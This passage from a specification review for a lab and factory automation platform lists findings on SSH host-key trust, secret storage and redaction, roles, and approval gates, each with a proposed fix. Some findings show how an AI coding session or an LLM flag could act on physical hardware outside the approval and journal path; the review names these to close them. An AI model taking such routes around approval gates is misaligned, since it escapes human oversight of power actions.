Also raised as: Pinned SSH known_hosts source for `UserKnownHostsFile=<pinned>` is undefined; StrictHostKeyChecking=yes with a pinned known_hosts, but no source for the pinned host keys; Pinned SSH known_hosts for Git hosts has no provisioning or re-pin path

What the documents say: `StrictHostKeyChecking=yes` needs the host key to already be in `<pinned>`, but nothing says where it comes from; the natural implementation ('Test connection' records it) is TOFU. ssh also reads `~/.ssh/config` (Include, ProxyCommand, IdentityAgent) unless `-F /dev/null` is given.

Why it matters: A deploy key is sent to whoever answers the first connection on the lab network, and the pinned file is wrong forever after.

Fix: In CLAUDE.md §5.7 'Egress': 'Each entry in `config/git-hosts.yaml` carries `ssh_host_keys: [ssh-ed25519 …]` maintained under Admin → Git hosts; the broker writes a per-operation known_hosts from it and never learns keys from the network.' 'Use': extend the ssh command with `-F /dev/null -o BatchMode=yes -o IdentityAgent=none -o ProxyCommand=none -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no -o ControlMaster=no`.

Invariants: INV-1, INV-14

Traceability: lenses internal-consistency, invariant-enforcement, operability, security-threat-model; ids security-threat-model#8, internal-consistency#37, invariant-enforcement#26, operability#18

### M10. PR/MR creation and protected-branch detection need a host API credential, but a Remote holds only `pat | ssh_key`
Where: `CLAUDE.md:428`, `CLAUDE.md:424`, `docs/DEVELOPMENT_PLAN.md:106`, `CLAUDE.md:430`, `docs/PROMPTS.md:140-141`, `docs/ui-demo/slas-ui-demo.html:1164`
Also raised as: PR/MR creation needs a host API token, which an ssh_key remote (the recommended deploy-key setup) does not have

What the documents say: An SSH private key cannot authenticate to the GitLab/Gitea/GitHub REST APIs, so an SSH remote can neither open an MR nor learn which branches are protected; a PAT may lack API scope. The broker has to guess how to apply its own push policy.

Why it matters: Either the feature silently degrades or the policy is unenforceable; an implementer invents the fallback.

Fix: In CLAUDE.md §5.7 'Storage': add optional `api_token_ref` (scoped to `api` / `write_repository`) and `protected_branches: [glob]` (default `[default_branch]`). 'Push policy': 'Without an API token the broker uses GitLab push options (`-o merge_request.create`) where supported, otherwise pushes the branch and shows "Branch pushed. Open the merge request here: <computed URL>"; protected-branch checks use the API when available, else the configured list.'

Owner decision: (a) optional `api_token_ref` per Remote plus GitLab push-options fallback and a computed MR link otherwise — recommended; (b) PAT-only remotes when PR/MR is wanted; (c) drop automatic PR/MR and always show the link.

Invariants: INV-14

Traceability: lenses cross-document, security-threat-model; ids security-threat-model#9, cross-document#19


### 3.2 Secrets and redaction

### M1. Validation wizard says target credentials 'come from the vault' but quickstart has no Vault, and no document defines how servers/stations and their credentials are registered; PROMPTS invents 'Admin → Stations' and the demo invents 'Admin → Servers'
Where: `CLAUDE.md:600`, `CLAUDE.md:120`, `CLAUDE.md:587-588`, `CLAUDE.md:99`, `docs/PROMPTS.md:190`, `docs/PROMPTS.md:170`, `docs/ui-demo/slas-ui-demo.html:1053`, `docs/ui-demo/slas-ui-demo.html:1212-1214`, `CLAUDE.md:746`, `CLAUDE.md:675`, `CLAUDE.md:424`, `docs/ui-demo/slas-ui-demo.html:1212`, `docs/DEVELOPMENT_PLAN.md:158-159`, `docs/PROMPTS.md:189-190`, `CLAUDE.md:160-162`, `docs/DEVELOPMENT_PLAN.md:41`, `CLAUDE.md:471`, `CLAUDE.md:786`, `CLAUDE.md:131-133`, `docs/DEVELOPMENT_PLAN.md:115-121`, `docs/DEVELOPMENT_PLAN.md:128-129`, `CLAUDE.md:388`
Also raised as: Target and station credentials 'come from the vault' but quickstart has no Vault and names no store for them; Target and station credentials have no defined store in quickstart; the wizard's 'vault' does not exist before P12; Admin subsections drift across documents and no Target/Station registry is defined; No target credential store is defined for quickstart; the wizard and demo point to 'the vault', which exists only in prod

What the documents say: INV-5 makes BMC/SSH/PDU/runner credentials opaque refs, but no document defines the registry that holds targets and stations or the store that holds their secrets: CLAUDE.md has no Admin sub-page, CLI verb, data model or §4.4 path for them; quickstart secrets are 'generated .env + Docker secrets' (static at compose time, so adding a server would need a restart, against INV-9), yet §9 says 'the vault'. PROMPTS P10 names an 'Admin → Stations' page and P8 a target '<alias>'; the demo names 'Admin → Servers' and even offers per-run typed credentials. Only Git credentials received a store design (§5.7).

Why it matters: The Validation and Factory agents cannot reach any hardware until targets exist; this is a data model and a page — both require an ADR per §15 — and P7's wizard 'pick a free server' has nothing to pick from.

Fix: CLAUDE.md §9 after line 592: add 'Admins register hardware under Admin → Servers (BMC address, SSH host, PDU outlet) and Admin → Stations (runner enrolment with a one-time code); credentials are paste-only, stored in the platform credential store — the same encrypted-by-reference store as Git remotes (§5.7 Storage: AES-GCM keyed from SLAS_SECRET_KEY in quickstart, Vault KV in prod) — with a fingerprint shown after save and "Test connection".' CLAUDE.md §9 line 600: replace 'credentials come from the vault' with 'credentials come from the platform credential store'. CLAUDE.md §4.4: note that Servers/Stations rows live in Postgres (no on-disk path). CLAUDE.md §3 CLI line 131-133: add '`server add|test|rm`, `station enrol|rm`'. docs/PROMPTS.md line 190: keep 'Admin → Stations'; docs/ui-demo/slas-ui-demo.html line 1053: keep 'Servers' (matches the fix); remove or gate the per-run typed credentials at line 1213-1214 behind the same store. Add the registry to docs/DEVELOPMENT_PLAN.md P7 scope (line 115-121) and an ADR to P7.

Owner decision: A (recommended default): one `slas_secrets` interface with two backends (AES-GCM by reference in quickstart, Vault KV in prod) shared by Git remotes and hardware targets, Admin → Servers and Admin → Stations sections. B: Vault (or OpenBao) mandatory even in quickstart — simpler story, but adds a container to install.sh and contradicts §3's quickstart row. Naming to confirm: 'Servers' (demo) vs 'Targets' (glossary).

Invariants: INV-10, INV-5, INV-7, INV-9

Traceability: lenses cross-document, fresh-data-lifecycle, fresh-shop-floor, fresh-ui-and-ux, invariant-enforcement, operability, spec-ambiguity; ids cross-document#18, fresh-data#12, fresh-floor#15, fresh-floor#3, invariant-enforcement#17, operability#17, spec-ambiguity#33, fresh-ui#43

### M2. `.env` sits inside `${SLAS_DATA_ROOT}`, which api and orchestrator mount whole; compose `env_file: [.env]` resolves relative to `compose/`, not the data root
Where: `CLAUDE.md:246`, `CLAUDE.md:716`, `CLAUDE.md:720`, `CLAUDE.md:703`, `CLAUDE.md:785`, `docs/DEVELOPMENT_PLAN.md:41-42`, `CLAUDE.md:728`, `docs/DEVELOPMENT_PLAN.md:43-44`, `docs/ui-demo/slas-ui-demo.html:1065-1069`, `.gitignore:2`, `CLAUDE.md:267`, `docs/DEVELOPMENT_PLAN.md:42`, `CLAUDE.md:576-577`
Also raised as: .env has three implied locations and is the P1 Settings store although env_file changes need a container recreate; .env lives under SLAS_DATA_ROOT, which api and orchestrator mount whole at /data; `.env` lives inside `${SLAS_DATA_ROOT}`, so the full `/data` mounts of api and orchestrator expose the master key on disk

What the documents say: The secrets file is placed in the data root; api and orchestrator mount the entire data root read-write (including `.env`, `Models/`, `Backups/`); the compose anchor references `.env` relative to `compose/` rather than `${SLAS_DATA_ROOT}/.env`, so install.sh, Admin → Settings and compose cannot all be reading the same file.

Why it matters: Any path-traversal or file-serving bug in api exposes all secrets and backups; the implementer must also guess which `.env` install.sh generates, which one Settings writes, and which one compose reads.

Fix: In CLAUDE.md §4.4: delete line 246 and state the location once, e.g. `${SLAS_CONFIG_DIR}/.env` (default `/etc/slas/.env`, mode 0600, written by install.sh and by Admin → Settings). In §12 line 703: `env_file: [${SLAS_CONFIG_DIR}/.env]` (non-secret settings only, see #1). In §12 lines 716 and 720: mount only the subtrees each service needs (`Tickets`, `SOP`, `Validation`, `Factory`, `Knowledge`, `Skills`) instead of `${SLAS_DATA_ROOT}:/data`, never `Backups/` or the config dir.

Invariants: INV-14, INV-5, INV-9

Traceability: lenses fresh-data-lifecycle, internal-consistency, invariant-enforcement, security-threat-model; ids internal-consistency#9, fresh-data#20, invariant-enforcement#2, security-threat-model#13

### M3. Mandatory after-screenshot on a `type` step that enters {{ secret }} can put the secret on the ticket
Where: `CLAUDE.md:487`, `CLAUDE.md:304`, `CLAUDE.md:390`, `CLAUDE.md:525`, `CLAUDE.md:99`, `CLAUDE.md:354-355`, `CLAUDE.md:346`
Also raised as: The mandatory after-screenshot of a `type` step can capture a secret the same table says is never logged; The mandatory after-screenshot of a `type` step that types a secret can capture the secret onto the ticket and into RCA/model context; Screenshot-after on `type` of a secret can capture the secret into the ticket; The mandatory after-screenshot of a `type` step can image a typed secret and reach model context

What the documents say: Not every input field masks what is typed (BIOS setup over KVM, terminals, some vendor tools). The after-screenshot is mandatory with no exception and is attached to the ticket; tickets feed the UI and the RCA retrieval corpus, so the secret can be shown to other users and enter a model context. 'Never logged' covers only the text argument.

Why it matters: A documented, mandatory path leaks a credential in contradiction of INV-5 whenever the target field is unmasked; the fix is a small rule but must be in the SSOT before P4 builds the driver.

Fix: CLAUDE.md §5.2 line 304 and §6.2 line 487: add 'When a `type` step references a secret input, the after-screenshot is withheld and the journal records "typed <input name>, screenshot withheld"; the next step's before-screenshot is taken only after a key press or focus change.' Add to §11 skills tests: 'a type step with a secret produces no after-screenshot'.

Invariants: INV-5, INV-6

Traceability: lenses fresh-data-lifecycle, invariant-enforcement, security-threat-model, spec-ambiguity, technical-feasibility; ids invariant-enforcement#15, fresh-data#8, security-threat-model#14, spec-ambiguity#32, technical-feasibility#24

### M4. Terminal recordings and raw stdout on tickets are retrievable by RCA RAG; redaction is pattern-based and only at the logging boundary
Where: `CLAUDE.md:439`, `CLAUDE.md:346`, `CLAUDE.md:354-355`, `CLAUDE.md:573-574`, `CLAUDE.md:99`, `CLAUDE.md:352-353`, `CLAUDE.md:786`
Also raised as: Terminal recordings 'with secrets redacted' rely on pattern redaction of a PTY stream that then becomes RCA/RAG input; Terminal session recordings 'with secrets redacted' feed the ticket that RCA/RAG models read

What the documents say: Redaction from config/redaction.yaml is pattern-based and cannot catch an arbitrary password a user pastes into the sandbox terminal. Once on the ticket, no passage says which ticket fields are embedded, that redaction is applied again at knowledge ingestion, or that terminal recordings and raw stdout are excluded from the RAG corpus, so such text can be retrieved into future RCA prompts for other users.

Why it matters: Secrets can cross users and enter model context through a path that no named CI check covers; the RAG corpus scope must be fixed before P5 builds ingestion.

Fix: CLAUDE.md §5.4 RCA pipeline line 354-356: add 'Only structured fields (findings, rca, sop, normalised log lines that passed redaction) are embedded; terminal recordings, raw stdout/stderr, console captures and screenshots are never indexed and are retrievable only by users authorised on that ticket.' §8.1 line 563-567: add gate 'secret-pattern hits in any prompt sent to vLLM: 0'.

Invariants: INV-5

Traceability: lenses invariant-enforcement, security-threat-model, technical-feasibility; ids invariant-enforcement#16, security-threat-model#15, technical-feasibility#18

### M5. Encrypted Git credentials and SLAS_SECRET_KEY have no joint backup/restore or key-rotation story
Where: `CLAUDE.md:424`, `CLAUDE.md:245-246`, `CLAUDE.md:430`, `CLAUDE.md:746`, `docs/PROMPTS.md:134-135`, `.gitignore:2,29`, `CLAUDE.md:246`, `CLAUDE.md:245`, `CLAUDE.md:132`, `docs/DEVELOPMENT_PLAN.md:161-162`
Also raised as: SLAS_SECRET_KEY lives in the data root beside the encrypted credential store; backup inclusion and master-key rotation are undefined

What the documents say: Ciphertexts live in the Postgres dump and the KEK lives in `${SLAS_DATA_ROOT}/.env`; neither §4.4 nor §8.4 says whether .env is backed up with the dump (key and ciphertext at rest together) or separately (dump alone unrestorable). §5.7 'Rotate' covers the per-remote secret only; KEK rotation and re-encryption of every credential_ref are unspecified.

Why it matters: After a host rebuild an operator restoring only the dump gets a git-broker that cannot decrypt any remote and every user must re-paste credentials; an implementer must guess the restore inputs and the rotation procedure, both of which change git-broker code.

Fix: CLAUDE.md §5.7 Storage row, add: 'The KEK is derived from `SLAS_SECRET_KEY`. `slas backup now` writes a KEK escrow to `Backups/keys/kek-<date>` wrapped with an operator passphrase set at install; it is never stored beside the dump. `slas backup restore` prompts for that passphrase. `slas secret rotate` re-encrypts every credential_ref inside git-broker in one transaction and stamps `kek_version` on each Remote row.' Add `Backups/keys/` to §4.4 and `secret rotate` to the §3 CLI list. Add to DEVELOPMENT_PLAN P6b done-when: 'restore of dump + escrow onto a fresh VM decrypts an existing remote; rotate then push succeeds'.

Owner decision: (a) Passphrase-wrapped KEK escrow written by `slas backup now`, separate from dumps — recommended default; (b) copy .env into the backup set (simplest, but key and ciphertext rest together); (c) require Vault whenever Git remotes are used (breaks the one-command quickstart promise in §3).

Invariants: INV-14

Traceability: lenses fresh-data-lifecycle, operability; ids operability#2, fresh-data#18

### M6. Redaction is built in three phases and four components (gateway, kernel log collector, git-broker audit, sandbox terminal recorder) with no shared owner of config/redaction.yaml
Where: `CLAUDE.md:786`, `CLAUDE.md:99`, `CLAUDE.md:172`, `CLAUDE.md:431`, `CLAUDE.md:439`, `CLAUDE.md:671-678`, `docs/DEVELOPMENT_PLAN.md:58`, `docs/DEVELOPMENT_PLAN.md:108-109`, `docs/DEVELOPMENT_PLAN.md:131-132`, `docs/PROMPTS.md:80-81`, `CLAUDE.md:352-353`, `CLAUDE.md:446-447`
Also raised as: Redaction is placed only in the LLM Gateway, yet done-whens require no credential in any log or bundle

What the documents say: P3 puts redaction in the gateway, P6 needs it in git-broker's audit log and the terminal recorder, P8 needs redacted log bundles, and INV-5 needs it in the kernel's log collector (P2), yet §13 lists no redaction package and §11 Separation names no owner, so four readers of config/redaction.yaml would be written in three phases.

Why it matters: Divergent implementations make the 'CI greps every log sink' gate unreliable: a pattern fixed in the gateway can still leak through the broker audit or the terminal recording. The implementer of each phase must guess whether to reuse or reimplement.

Fix: CLAUDE.md §13 packages: add `slas-redact`; §11 Separation: add '`packages/slas-redact` (the only reader of config/redaction.yaml; used by the kernel log collector, llm-gateway, git-broker audit, the sandbox terminal recorder and validation log bundles)'. DEVELOPMENT_PLAN.md P2 scope: add '`slas-redact` with config/redaction.yaml, applied in kernel.logs.collect()'; P2 done-when: add 'a fake token, PAT and SSH private key written to stdout by a NullAgent step are absent from the journal and the collected bundle'; P3, P6, P8 scope: 'reuse slas-redact' instead of separate redaction wording. PROMPTS.md P2 and P3: mirror.

Invariants: INV-14, INV-5

Traceability: lenses fresh-data-lifecycle, plan-sequencing-and-coverage; ids plan-sequencing-and-coverage#10, fresh-data#9


### 3.3 Consensus, approvals and human gates

### M1. config/rbac-roles.yaml is a P1 deliverable but no document names the roles or the capability strings
Where: `CLAUDE.md:786`, `CLAUDE.md:448-450`, `CLAUDE.md:468`, `CLAUDE.md:678`, `docs/PROMPTS.md:57-58`, `docs/DEVELOPMENT_PLAN.md:41`, `docs/ui-demo/slas-ui-demo.html:1048-1051`, `CLAUDE.md:345`, `CLAUDE.md:240`, `docs/ui-demo/slas-ui-demo.html:919`, `docs/ui-demo/slas-ui-demo.html:1047-1051`, `docs/DEVELOPMENT_PLAN.md:50-51`, `CLAUDE.md:325`, `CLAUDE.md:659-660`, `docs/ui-demo/slas-ui-demo.html:1048-1049`, `CLAUDE.md:101`, `CLAUDE.md:600`, `CLAUDE.md:659`, `docs/ui-demo/slas-ui-demo.html:704`, `docs/ui-demo/slas-ui-demo.html:1047`
Also raised as: Ticket read scope is stated nowhere in the SSOT; only the demo implies org-wide visibility; Line lead, lab owner and operator have no role or capability in slas-authz; only Git capabilities are enumerated; The requester can approve their own destructive steps and factory overrides; no approval capability or separation of duties exists

What the documents say: The only capability strings anywhere are the git:* set (§5.7) and the skill `requires` values (§6.1). The demo shows four roles with different approval rights, but no document lists the roles, their capabilities, or which capability gates each INV-7 approval, target lease, model swap, skill import or knowledge upload.

Why it matters: P1 must write rbac-roles.yaml and P4/P6/P7/P9 each check capabilities at the executor (§11). Without canonical names, P1 invents a set and every later phase invents its own, and the INV-7 approval gate has no named capability to check.

Fix: Add §5.8 "Roles and capabilities": default roles administrator, validation engineer, factory lead, firmware engineer, viewer (the demo's set); namespaces `tickets:{export}`, `runs:{start,pause,abort}`, `approvals:{ac_cycle,firmware_flash,secure_erase,bios_reset,raid_reconfigure,factory_verdict,station_config}` (one per INV-7 item), `targets:{lease,manage}`, `stations:{lease,manage}`, `models:manage`, `skills:{import,enable}`, `knowledge:{upload,delete}`, the §6.1 set `screen ssh redfish files network`, and the existing `git:*`. Ship as `config/rbac-roles.yaml`. P1 done-when adds: "the four demo roles exist; `slas user add --role` accepts only names from the file".

Owner decision: yes

Invariants: INV-7

Traceability: lenses fresh-data-lifecycle, fresh-shop-floor, security-threat-model; ids fresh-data#2, fresh-data#1, fresh-floor#8, security-threat-model#20

### M2. On-fail behaviour and voter count are per-job wizard choices in §9 and the demo but fixed in §10.3 and §5.3
Where: `docs/ui-demo/slas-ui-demo.html:1259`, `CLAUDE.md:660`, `CLAUDE.md:601`, `CLAUDE.md:325`, `docs/ui-demo/slas-ui-demo.html:1258`, `docs/ui-demo/slas-ui-demo.html:1049`, `docs/DEVELOPMENT_PLAN.md:142`, `docs/PROMPTS.md:181`, `docs/ui-demo/slas-ui-demo.html:1065`, `docs/ui-demo/slas-ui-demo.html:973`, `CLAUDE.md:728`
Also raised as: Factory FAIL behaviour is single in §10.3 but a choice in the wizard; no Held state or release rule; Voter count is set in three places: Models toggles, Admin minimum, per-job factory choice; Factory on-fail option 'Continue to the next unit' contradicts §10.3's fixed FAIL behaviour

What the documents say: §10.3 fixes FAIL → station held and §5.3 fixes 3 voters per decision in config/consensus.yaml, while §9's factory wizard step 3 makes 'on-fail behaviour' and 'voters' per-job choices and the demo offers 'Continue to the next unit' and '5 models' to whoever starts the job.

Why it matters: Whether these are line policy set by a line lead or options set by the operator at job start changes the wizard, the authz model and the executor's state machine; 'continue' also implies placing a second unit while the failed one is still powered on the same station.

Fix: Resolve in §9 and §10.3: 'On-fail behaviour and voter count are template/policy settings edited by a line lead (`factory:edit_template`); wizard step 3 shows them read-only with the sentence: If a test fails, the station is held and the line lead is notified.' Remove 'Continue to the next unit' and the per-job voter select from the demo, or define 'continue' as a template-level policy that requires the failed unit powered off and its SN unbound.

Owner decision: (a) hold is the only behaviour, as §10.3 states — recommended; (b) 'continue' allowed as a template-level policy for non-safety failures, set by a line lead, never by the operator at job start.

Traceability: lenses fresh-runtime-state, fresh-shop-floor, fresh-ui-and-ux; ids fresh-floor#10, fresh-state#24, fresh-ui#25, fresh-ui#34

### M3. P3 'a voter that fails schema twice trips the breaker' contradicts the §11 fallback tiers, and no document defines breaker semantics
Where: `docs/DEVELOPMENT_PLAN.md:63`, `CLAUDE.md:680-683`, `CLAUDE.md:173`, `docs/DEVELOPMENT_PLAN.md:58-59`

What the documents say: §11 says two schema failures inside one request lead to tier 2 (simplified schema) and then tier 3 (escalate to planner); the plan says two schema failures trip the circuit breaker, which removes the voter from rotation. The breaker is named in §4.2, P3 and PROMPTS P3 but its unit (per request vs per instance), threshold and half-open behaviour appear nowhere.

Why it matters: Decides whether a flaky voter degrades one cross-check or takes a whole role offline and pages the operator (P11 alerts on breaker trips); the gateway's central failure path is specified two different ways.

Fix: docs/DEVELOPMENT_PLAN.md line 63 → 'a voter instance that exhausts fallback tiers 0-2 on N consecutive requests (N from config/consensus.yaml, default 5) trips its breaker; the router then runs in the documented "single model + flagged" mode and raises an alert'. CLAUDE.md §5.3 after line 330: add 'Circuit breaker: per inference instance; opens after N consecutive requests that exhaust tiers 0-2 or time out; half-open probe every 60 s; state visible on the Models page and as a metric.'

Traceability: lenses fresh-cross-document-and-plan; ids fresh-plan#22

### M4. P8 and P10 prompts let the Claude Code session itself act on real hardware/stations outside the platform's approval and journal path
Where: `docs/PROMPTS.md:170-171`, `docs/PROMPTS.md:190-192`, `CLAUDE.md:45`, `CLAUDE.md:97`, `docs/DEVELOPMENT_PLAN.md:130-131`, `docs/DEVELOPMENT_PLAN.md:191`

What the documents say: The P8 prompt's 'Do not run any power action until I confirm' reads as permission for the session to run power actions on a lab server after a chat confirmation; P10 asks the session to tune a skill 'against the real station'. A chat reply is not the INV-7 per-run approval, and a session calling slas_hal or ipmitool directly bypasses the INV-6 journal, the guardrail engine and the lease. The plan's own P8 done-when routes the real AC cycle through the approval flow, so the prompt and plan disagree on who drives real hardware.

Why it matters: This is the only place a document invites a model-driven process to act on physical hardware without the deterministic executor's gates; §0.4 warns that this platform powers servers off.

Fix: docs/PROMPTS.md line 170-171: replace with 'Never invoke slas_hal, ssh, ipmitool or Redfish against <alias> from this session or from tests. I run the real DC/AC cycle myself from the WebUI through the approval dialog and paste the journal, SOL and logs back to you.' docs/PROMPTS.md line 190-192: 'Tune from screenshots and logs I record by running the skill on the station through the platform; the session never sends steps to <alias>.' docs/DEVELOPMENT_PLAN.md line 191: 'Real hardware and displays are used only by the owner, through the platform, for manual verification in P8 and P10; no test or session touches them.'

Invariants: INV-3, INV-6, INV-7

Traceability: lenses fresh-prompts-adr-gitignore; ids fresh-prompts#43

### M5. Approval is not bound to plan content, and skills expand after approval, so a destructive skill step can bypass INV-7
Where: `CLAUDE.md:260-261`, `CLAUDE.md:263-265`, `CLAUDE.md:395-396`, `CLAUDE.md:345`, `CLAUDE.md:392`, `CLAUDE.md:241`, `docs/DEVELOPMENT_PLAN.md:74-75`, `CLAUDE.md:166`, `CLAUDE.md:694`, `CLAUDE.md:261`, `CLAUDE.md:678`
Also raised as: Approvals are recorded in the api but the executor has no verifiable artefact binding approval to the plan it runs

What the documents say: §5.1 requests approval at PLAN on the plan's own steps but expands skills into steps at ACT, so a destructive step inside a referenced skill is invisible to the PLAN-time approval and the §10.2 compiler check; and `approvals[]` is not bound to plan content, so a skill edited, re-imported or re-toggled between Approved and Running changes what an approved ticket executes.

Why it matters: Line 396 and the P4 done-when already require the approval requirement to appear 'at run', so there is no silent bypass — but that forces a mid-run approval interrupt (target possibly mid-cycle) and leaves the approval object unbound to content. The P2 approval schema and the P4 compile point must be decided.

Fix: Move skill compilation into PLAN: `Plan` embeds each referenced skill's compiled StepPlan with its `skill_content_hash` (the hash already exists at EXPORT, line 392) and bound inputs; the frozen copy is stored under `Skills/compiled/<ticket-id>/` (folder already in §4.4). `approvals[]` entries carry `{approver, at, plan_hash = sha256(canonical Plan)}`; the executor refuses to start or resume when the hash differs and returns the ticket to Planned with 'The plan changed after approval; approve it again.' Change §5.1 line 265 to 'skills, already expanded at PLAN, run here'. Keep the run-time destructive check (line 396) as defence in depth.

Invariants: INV-12, INV-3, INV-6, INV-7

Traceability: lenses fresh-runtime-state, security-threat-model; ids fresh-state#5, security-threat-model#21

### M6. 'Destructive' has three different memberships: INV-7, §6.2 redfish row, and guardrails requires_approval
Where: `CLAUDE.md:101`, `CLAUDE.md:496`, `CLAUDE.md:395-396`, `CLAUDE.md:648-649`, `CLAUDE.md:636`, `docs/DEVELOPMENT_PLAN.md:74`, `docs/ui-demo/slas-ui-demo.html:1126`, `docs/DEVELOPMENT_PLAN.md:125`, `docs/DEVELOPMENT_PLAN.md:74-75`, `CLAUDE.md:646-649`, `CLAUDE.md:752`, `CLAUDE.md:755`
Also raised as: Power actions are 'destructive' (per-run approval) for skills, but only AC cycle needs approval under INV-7/guardrails, so DC cycling is gated in skills and ungated in plans; DC power actions are 'destructive' in the skill table but not in the INV-7 / guardrails approval list; config/guardrails.yaml requires_approval omits INV-7 factory items (PASS/FAIL override, station config change) and factory-executor has no GUARDRAIL_POLICY

What the documents say: A redfish power_off/force_off/graceful_restart inside a skill is 'destructive' and needs approval at every run (§6.2, §5.6, P4 done-when), but the same DC cycle as a Validation plan primitive is neither in INV-7 nor in requires_approval and runs up to 100 times per approved run; the demo flags only the AC cycle. The risk classifier, wizard copy and approval gate cannot be built from three lists. Factory jobs have no named approval moment ('Start job' is not stated to be one).

Why it matters: Depending on which passage the implementer follows, either the Validation core loop needs an approval per cycle or skills bypass INV-7.

Fix: CLAUDE.md §2 INV-7 line 101: append 'The authoritative list is `config/guardrails.yaml` requires_approval; §5.6 and §6.2 use it.' §6.2 line 496: change the Risk cell to 'get_* safe · power_on/power_off/force_off/graceful_restart caution (covered by the run-level approval); AC cycle is not a skill primitive'. §5.6 line 395-396: 'the per-run approval is the wizard's Approve-and-start / Start job step, which is recorded as an approval when the plan contains caution or destructive steps'. docs/DEVELOPMENT_PLAN.md line 74 and PROMPTS.md line 98-99: change 'approval requirement' to 'caution notice and run-level approval'.

Owner decision: A (recommended): DC power actions are 'caution' and covered by the one human approval every run already has (Validation GATE, Factory Start job); AC cycle and the INV-7 list stay 'destructive' with explicit per-run approval; guardrails.yaml is the single source. B: keep DC power actions 'destructive' everywhere, and define 'per-run approval' as the wizard's approve step so a 100-cycle DC plan is approved once; then add dc_cycle to requires_approval and to INV-7.

Invariants: INV-7

Traceability: lenses internal-consistency, invariant-enforcement, spec-ambiguity; ids invariant-enforcement#7, internal-consistency#26, spec-ambiguity#30, internal-consistency#27

### M7. INV-3 is enforced only by an env flag LLM_IN_CONTROL_LOOP; executors share slas-backend with llm-gateway and no check is named
Where: `CLAUDE.md:752`, `CLAUDE.md:755`, `CLAUDE.md:727`, `CLAUDE.md:751`, `CLAUDE.md:637`, `CLAUDE.md:693-697`, `docs/PROMPTS.md:268-272`

What the documents say: A runtime toggle implies the executor contains a code path that calls a model when set to true, and both executors have a network route to llm-gateway on slas-backend. Neither §11, §8.1, the plan's done-criteria nor the PROMPTS weekly health check names an import rule, CI test or network policy for INV-3.

Why it matters: A flag is not an invariant; a compose override or a default change silently puts the model in the power loop, and nothing in CI would notice.

Fix: CLAUDE.md §12 lines 752 and 755: delete `LLM_IN_CONTROL_LOOP`. §11 Tests (line 687-691): add 'import-linter contract: services/validation-executor, services/factory-executor and packages/slas-hal import no gateway client and no HTTP client configured for llm-gateway; a compose lint asserts the executors and llm-gateway share no network except slas-observability'. §12: give executors their own `slas-exec` network to api/orchestrator instead of slas-backend, or list the exception. docs/PROMPTS.md weekly health check line 268-272: add 'any import of the gateway client outside orchestrator/api'.

Invariants: INV-3

Traceability: lenses invariant-enforcement; ids invariant-enforcement#9

### M8. Consensus budget has no denominator, no metric, and an undefined interaction with the unanimous Factory PASS rule
Where: `CLAUDE.md:329-330`, `CLAUDE.md:325`, `CLAUDE.md:568-572`, `CLAUDE.md:728`, `CLAUDE.md:124`, `docs/DEVELOPMENT_PLAN.md:60`, `docs/DEVELOPMENT_PLAN.md:153`, `docs/DEVELOPMENT_PLAN.md:183`, `CLAUDE.md:322`, `CLAUDE.md:659`, `CLAUDE.md:332`, `docs/ui-demo/slas-ui-demo.html:973`
Also raised as: Degraded 'single model + flagged' cannot satisfy the unanimous rules; the schema has no degraded marker

What the documents say: '5% of daily tokens' has no denominator (which roles, which day boundary) and no exported gauge; when spent, a Factory PASS that requires 3 unanimous voters cannot be reached by 'single model + flagged', so every unit for the rest of the day falls to 'line lead decides'. Whether factory verdicts draw from the shared budget at all is unstated. The alert-destination part is not a gap: P11 (pre-prod) provides alerting to a local channel, though that itself drifts from §3 which lists alerting under prod only.

Why it matters: A coding user's morning cross-checks can disable automatic factory verdicts in the afternoon; the router-vs-factory rule changes gateway code and the line lead's workload, so an implementer must not guess it.

Fix: CLAUDE.md §5.3 replace the budget sentence: 'Budget = 5% of the previous 7-day average of gateway tokens across all generate roles, per calendar day in the platform timezone, split per agent in `config/consensus.yaml` (defaults factory 50%, validation 30%, coding 20%). Factory PASS verdicts are exempt: they always run 3 voters; a degraded single-voter result is never a PASS and goes to the line lead. Exported as `slas_consensus_budget_used_ratio{agent}`; the Home page shows a banner at 80%.' §8.2 add the gauge. §3 quickstart Observability: 'alerts surface as Home-page banners and `slas status`' (aligns with P11).

Owner decision: (a) Factory PASS verdicts are exempt from the budget and always use 3 voters — recommended default; (b) factory draws from a reserved per-agent pool and degrades only within it; (c) uniform budget, with the explicit rule that a degraded verdict always goes to the line lead.

Invariants: INV-11

Traceability: lenses fresh-runtime-state, operability; ids operability#16, fresh-state#21


### 3.4 Skills and capabilities

### M1. §6.3 examples put `id` inside primitive args and use `{{ steps.<id>.<field> }}` and a condition grammar that §6.1/§6.2 never define — yet P4 requires them to validate against the generated schema
Where: `CLAUDE.md:479`, `CLAUDE.md:529`, `CLAUDE.md:543`, `CLAUDE.md:544-545`, `CLAUDE.md:470`, `CLAUDE.md:499`, `docs/DEVELOPMENT_PLAN.md:73`, `docs/PROMPTS.md:91`, `docs/PROMPTS.md:97-98`, `docs/ui-demo/slas-ui-demo.html:298`, `CLAUDE.md:544-546`, `CLAUDE.md:475`, `CLAUDE.md:483`, `CLAUDE.md:540`, `CLAUDE.md:495`, `CLAUDE.md:386`
Also raised as: Skill step `id` placement contradicts between the schema line and both examples; Per-primitive output fields (steps.<id>.file, .count) and `outputs.from` semantics are undefined; 'sel-collect-clear' declares requires:[redfish] but uses `copy` (needs files/ssh), and the `steps.sel.file/count` output shape is undefined

What the documents say: §6.1 line 479 places `id` at step level beside the primitive key; both §6.3 examples (lines 529, 543) place it inside the primitive's args map, so a schema generated from §6.1 rejects the SSOT's own examples — while plan P4 (line 73) and PROMPTS P4 (line 91, 97-98) require exactly that validation to pass. The examples also rely on a `steps.<id>.<field>` namespace with fields `file` and `count`, and on a comparison grammar for `condition`/`when`, none of which §6.1 or §6.2 specify; §6.2 lists no outputs per primitive. The demo additionally shows sel-collect with 4 steps versus 3 in §6.3.

Why it matters: INV-12 requires validation against the schema; if the SSOT's examples do not validate, the P4 session will bend the schema or the compiler to fit, and the templating and expression evaluator will be invented ad hoc.

